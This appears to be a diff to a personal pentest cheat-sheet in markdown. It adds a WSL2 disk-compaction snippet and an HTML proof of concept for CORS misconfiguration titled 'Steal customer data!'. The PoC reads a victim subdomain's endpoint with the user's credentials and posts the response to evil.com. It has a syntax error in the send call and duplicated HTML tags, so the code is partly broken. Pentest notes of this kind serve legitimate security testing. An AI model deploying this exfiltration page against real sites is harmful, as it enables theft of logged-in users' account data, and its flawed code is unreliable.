 Quick and dirty setup of instance with .tmux.conf and squid-proxy
 
@@ -968,3 +964,58 @@ sudo apt update && \
     git clone https://github.com/maurosoria/dirsearch && \
     cd
 ```
+
+
+
+### Windows
+
+#### Cleaning WSL2 storage after deletion of files (Home edition)
+
+```powershell
+wsl --shutdown
+diskpart
+
+select vdisk file="C:\Users\Syed Umar Arfeen\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu20.04onWindows_79rhkp1fndgsc\LocalState\ext4.vhdx"
+attach vdisk readonly
+
+compact vdisk
+detach vdisk
+exit
+```
+
+
+
+#### POC for C0RS
+
+```html
+<!DOCTYPE html>
+<html>
+    <body>
+        <center>
+        <h3>Steal customer data!</h3>
+        <html>
+            <body>
+                <button type='button' onclick='cors()'>Exploit</button>
+                <p id='demo'></p>
+                <script>
+                    function cors() {
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    var a = this.responseText; // Sensitive data from subdomain.site.com about user account
+                    document.getElementById("demo").innerHTML = a;
+                    xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
+                    xhttp.withCredentials = true;
+                    console.log(a);
+                    xhttp.send("data=" a);
+                    }
+                    };
+                    xhttp.open("GET", "https://subdomain.site.com/data-endpoint", true);
+                    xhttp.withCredentials = true;
+                    xhttp.send();
+                    }
+                </script>
+            </body>
+        </html>
+```
+
